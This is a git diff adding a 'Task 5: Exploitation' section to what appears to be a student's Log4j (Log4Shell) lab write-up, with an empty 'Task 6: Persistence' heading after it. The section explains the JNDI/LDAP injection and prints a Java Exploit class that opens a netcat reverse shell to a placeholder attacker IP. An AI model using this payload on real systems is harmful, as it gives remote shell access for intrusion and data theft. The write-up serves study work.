@@ -49,6 +49,30 @@ Here we are Connecting  nc -lnvp 9999  netcat to connect the  website  curl 'htt
 
 <img width="1919" height="933" alt="Screenshot 2026-03-22 140116" src="https://github.com/user-attachments/assets/9a73f039-f1b2-4f96-a2ad-8c494142741c" />
 
+## Task 5: Exploitation
+
+<img width="1919" height="1065" alt="Screenshot 2026-03-22 184129" src="https://github.com/user-attachments/assets/5851f4d1-0395-470e-a363-47a134eafdf1" />
+
+<img width="1919" height="1045" alt="Screenshot 2026-03-22 184138" src="https://github.com/user-attachments/assets/97d43584-54da-47f8-981d-0a07cf0a9770" />
+
+In this Log4j vulnerability lets attackers run code using a special text input. The attacker sends a string like ${jndi:ldap://...} to the target.The target connects to the attacker’s server and it listen to the port Listening on 0.0.0.0:1389  and That file runs on the target and we can get the acces and we can steal data or any information. This command starts a fake LDAP server and it is used to trick the victim into the malicious file that we code.
+
+### public class Exploit {
+    static {
+        try {
+            java.lang.Runtime.getRuntime().exec("nc -e /bin/bash YOUR.ATTACKER.IP.ADDRESS 9999");
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+}
+
+
+## Task 6: Persistence
+
+
+
+
 
 
 
